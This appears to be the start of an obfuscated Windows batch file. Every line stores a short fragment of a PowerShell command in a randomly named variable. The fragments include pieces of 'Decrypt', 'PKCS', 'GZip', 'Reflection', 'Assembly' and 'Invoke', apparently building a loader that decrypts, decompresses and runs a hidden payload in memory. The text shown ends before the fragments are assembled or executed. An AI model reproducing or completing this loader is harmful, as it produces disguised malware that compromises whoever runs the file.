@echo off
set "mLcZOglwoI=ode]"
set "awFJxjOMWF=ect "
set "djnRxusZkf=);$V"
set "qeLBHoSgFH=ert]"
set "oRncYpApDU=();$"
set "AaYNsKmBFV=gnir"
set "ndmGOtvHhk=$pgw"
set "BtPBjjNmWx=nirt"
set "zuLQdVZwpy=wuG "
set "aoDIWQdvyj=oE.I"
set "KDDZdDluVC=s75K"
set "ZsWuyALlQu=join"
set "BLzTjMfyox=TYoE"
set "mBabIzwcTQ=stem"
set "crBJtDyswW='[-1"
set "XnNIHhnYfR=:: '"
set "XPiGXWxBqK=gMod"
set "qRaZFMGryw=bstr"
set "voFcaSmaNB=.Cre"
set "lPgtFOYKUe=bYBW"
set "vNMHyIYjAu=lBlo"
set "HpSYPWTsZg=sKNv"
set "JVcLeIiGUA=tryP"
set "eFZhjpOgGe=grap"
set "hXoWyiQrag=1] -"
set "wpPymnhgCD=ptog"
set "oJFkaulfGY=m.IO"
set "gOGqdJJKyN=e = "
set "kKIDJljEvT=embl"
set "iJvbkAyKMU=pher"
set "UITCAlQLYQ=pose"
set "ZnJMAmIPwJ=[-1."
set "RuufwhSVLA=Syst"
set "VzMqyeaWzh=and "
set "qTarLRSYOu=.Dis"
set "IubGXXIuTu= = $"
set "ZQIauOENkz=[]] "
set "mUYrydmnZd=L4Yi"
set "uUVVafBVyD=]::N"
set "qMwxcovDlJ=[Sys"
set "nzFwmqPqLg=P = "
set "hytuXJEwhi=RmAx"
set "TbPtomWxUq=pStr"
set "DcZmBPkrgV=gsYZ"
set "ADqILlCzaV=n ''"
set "NVdMRadcFJ=ddin"
set "oFOHaUXblb=Nv ="
set "IjfWgPukuU='txe"
set "DZyUEtMGPZ=i.Su"
set "PFgXmRuUoT=:('g"
set "JDfooglMeL=$swT"
set "EHPPQdJYUq=join"
set "wXFaDUwafs=am;$"
set "TJBTEbwNia=Invo"
set "zQvbTqfYjX=morF"
set "dnaiUGjLMZ=);$l"
set "lqihJAIwnV=('Tg"
set "mJSiDIjqBc=PTtG"
set "WKbokoBUdm=fYWd"
set "cxgbMuztfI=.GZi"
set "UglCnRdVOU=..-1"
set "jPlxhneaRQ=);$e"
set "CXCamOVkby=('%*'"
set "kiTnqlcAkt=rofi"
set "PvMxBVBMnn=saBm"
set "ZDcJMahcAH=$ltl"
set "GLcbAVLVeM=wTIK"
set "WgHprAqNtZ=ress"
set "HxlvcvoRAe= '')"
set "ReGImoJoRV=ress"
set "SoXVnsKTZP=PxEW"
set "xaHhcwuOWe=Obje"
set "PPEurQfZAx=ecry"
set "hPfoekSyVN=flec"
set "ovSWAeSacR=-Obj"
set "brBfKvojCf=PKCS"
set "OTeKFhDgyh=oArr"
set "FwEqJfpCXr=, (,"
set "vHvMbULucQ=eMVs"
